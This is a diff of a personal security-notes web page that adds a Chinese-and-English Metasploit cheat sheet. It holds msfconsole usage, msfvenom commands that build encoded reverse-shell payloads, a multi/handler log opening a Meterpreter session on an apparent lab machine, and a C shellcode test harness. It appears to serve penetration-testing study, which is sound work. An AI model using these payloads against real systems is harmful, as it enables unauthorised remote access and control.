@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Misc_Tools/Misc_Pentesting_Tools.html">Misc Tools</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Misc_Tools/Tools_Metasploit.html">Tools-Metasploit</a></h1>
                 <span class="ModifiedDate">
-            February 15, 2021 at 11:52 PM        </span>
+            February 15, 2021 at 11:53 PM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/900_Misc_Tools/510_Tools-Metasploit.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,227 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Metasploit">Metasploit</h1>
+<h6 id="page_tags">tags: <code>Security</code> <code>Tools</code></h6>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Metasploit">Metasploit</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>Tools</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Reference">Reference</a></p>
+</li>
+<li>
+<p><a href="#page_Msfconsole">Msfconsole</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_modules">modules</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Auxiliary">Auxiliary</a></p>
+</li>
+<li>
+<p><a href="#page_Exploits">Exploits</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_MSFVenom">MSFVenom</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_cheatsheet">cheatsheet</a></p>
+</li>
+<li>
+<p><a href="#page_overview">overview</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_EXITFUNC">EXITFUNC</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Useful_Payload">Useful Payload</a></p>
+</li>
+<li>
+<p><a href="#page_Payload_stagednon_staged">Payload staged/non-staged</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_example_using_staged_payload">example: using staged payload</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_test_payload">test payload</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Meterpreter">Meterpreter</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Online_Resources">Online Resources</a></p>
+</li>
+<li>
+<p><a href="#page_Commands">Commands</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_execute">execute</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h1 id="page_Reference">Reference</h1>
+<p><a href="https://www.offensive-security.com/metasploit-unleashed/using-exploits/" class="Link--external" rel="noopener noreferrer">Using exploits</a></p>
+<h1 id="page_Msfconsole">Msfconsole</h1>
+<pre><code>msf&gt; search snmp
+msf&gt; use exploit/.../.../...
+msf&gt; info
+msf&gt; show options
+msf&gt; set RHOST 192.168...
+msf&gt; set LHOST 192.168...
+msf&gt; set LPORT ...
+msf&gt; set PAYLOAD windows/...
+msf&gt; exploit
+</code></pre>
+<ul>
+<li>
+<p>set global parameter
+<code>msf&gt; setg RHOSTS 192.168...</code></p>
+</li>
+<li>
+<p>database services</p>
+</li>
+</ul>
+<pre><code>msf&gt; hosts
+msf&gt; db_nmap 192.168.31.200-254 --top-ports 20
+msf&gt; services -p 443 # print all machine open 443 port
+</code></pre>
+<h2 id="page_modules">modules</h2>
+<ul>
+<li>
+<h4 id="page_Auxiliary">Auxiliary</h4>
+</li>
+</ul>
+<pre><code>msf &gt; show auxiliary
+</code></pre>
+<ul>
+<li>
+<h4 id="page_Exploits">Exploits</h4>
+</li>
+</ul>
+<h1 id="page_MSFVenom">MSFVenom</h1>
+<h2 id="page_cheatsheet">cheatsheet</h2>
+<pre><code>msfvenom --list payloads | grep linux | grep x64    // search payloads
+msfvenom -p linux/x64/exec --list-options           // list options
+// generate full interactive reverse shell
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin 
+</code></pre>
+<h2 id="page_overview">overview</h2>
+<pre><code>msfvenom -p windows/shell_reverse_tcp  \
+LHOST=192.168.30.5                     \
+LPORT=443                              \
+-f c                                   \
+-a x86                                 \
+--platform windows                     \
+-b &quot;\x00\x0a\x0d&quot;                      \
+-e x86/shikata_ga_nai                  \
+EXITFUNC=thread
+</code></pre>
+<p>注意這個生成的 <code>shellcode</code> 會需要用到 <code>stack</code> 自我解壓縮 ，如果 <code>shellcode</code> 放在 <code>stack</code> 中(<code>ESP</code>指向位置)，要記得在最前頭塞 <code>nop</code></p>
+<h3 id="page_EXITFUNC">EXITFUNC</h3>
+<ul>
+<li>thread: This method is used in most exploitation scenarios where the exploited process (e.g. IE) runs the shellcode in a sub-thread and exiting this thread results in a working application/system (clean exit)</li>
+<li>process: This method should be used with <strong>multi/handler</strong>. This method should also be used with any exploit where a master process restarts it on exit.</li>
+<li>seh: This method should be used when there is a structured exception handler (SEH) that will restart the thread or process automatically when an error occurs.</li>
+</ul>
+<p><a href="https://hackmd.io/@WildfootW/Cybersecurity/%2F%40WildfootW%2FS1DpqYLYW" class="Link--external" rel="noopener noreferrer">shellcode note</a>
+<a href="https://netsec.ws/?p=331" class="Link--external" rel="noopener noreferrer">msfvenom command cheat sheet</a></p>
+<h2 id="page_Useful_Payload">Useful Payload</h2>
+<ul>
+<li>
+<code>use windows/meterpreter/reverse_https</code>
+</li>
+<li>
+<code>use windows/meterpreter/reverse_tcp_allports</code>
+</li>
+</ul>
+<h2 id="page_Payload_stagednon_staged">Payload staged/non-staged</h2>
+<pre><code>msfvenom -p &lt;payload&gt; -f &lt;format&gt; LHOST= LPORT= -e &lt;encoder&gt; -b &lt;bad-chars&gt;
+# -e x86\shikata_ga_nai
+msfvenom –list payload
+</code></pre>
+<ul>
+<li>staged payload <code>Metasploit exploit/multi/handler</code> <code>windows/shell/reverse_tcp</code>
+</li>
+<li>non-staged payload <code>nc -nvlp [port]</code> <code>windows/shell_reverse_tcp</code> (sent in its entirety in one go)</li>
+</ul>
+<pre><code>windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)
+windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell
+</code></pre>
+<h3 id="page_example_using_staged_payload">example: using staged payload</h3>
+<pre><u style="text-decoration-style:single">msf6</u> &gt; use exploit/multi/handler 
+<font color="#277FFF"><b>[*]</b></font> Using configured payload generic/shell_reverse_tcp
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; set lhost 10.10.14.12
+lhost =&gt; 10.10.14.12
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; set lport 7702
+lport =&gt; 7702
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; set payload linux/x64/meterpreter/reverse_tcp 
+payload =&gt; linux/x64/meterpreter/reverse_tcp
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EC0101"><b>multi/handler</b></font>) &gt; run
+</pre>
+<pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=7702 -f elf -o msf.bin
+// generate upload &amp; execute
+</code></pre>
+<pre><font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 10.10.14.12:7702 
+<font color="#277FFF"><b>[*]</b></font> Sending stage (3008420 bytes) to 10.10.10.61
+<font color="#277FFF"><b>[*]</b></font> Meterpreter session 1 opened (10.10.14.12:7702 -&gt; 10.10.10.61:46986) at 2020-11-14 21:02:55 +0800
+
+<u style="text-decoration-style:single">meterpreter</u> &gt; ls
+</pre>
+<h2 id="page_test_payload">test payload</h2>
+<p>format 選 <code>-f c</code></p>
+<pre><code>#include &lt;stdio.h&gt;
+
+unsigned char buf[] = &quot;&quot;
+
+int main()
+{
+    void (*f)() = (void (*)()) buf;
+    f();
+    return 0;
+}
+</code></pre>
+<p>編譯</p>
+<pre><code>gcc -m32 -z execstack
+</code></pre>
+<h1 id="page_Meterpreter">Meterpreter</h1>
+<h2 id="page_Online_Resources">Online Resources</h2>
+<ul>
+<li>
+<a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" class="Link--external" rel="noopener noreferrer">METERPRETER BASIC COMMANDS</a>
+</li>
+</ul>
+<h2 id="page_Commands">Commands</h2>
+<h3 id="page_execute">execute</h3>
+<pre><code>meterpreter &gt; execute -f bash -i
+-f &lt;opt&gt;  The executable command to run.
+-i        Interact with the process after creating it.
+-a &lt;opt&gt;  The arguments to pass to the command.
+-c        Channelized I/O (required for interaction).
+</code></pre>
+    </div>
 
         <nav>
         <ul class="Pager">
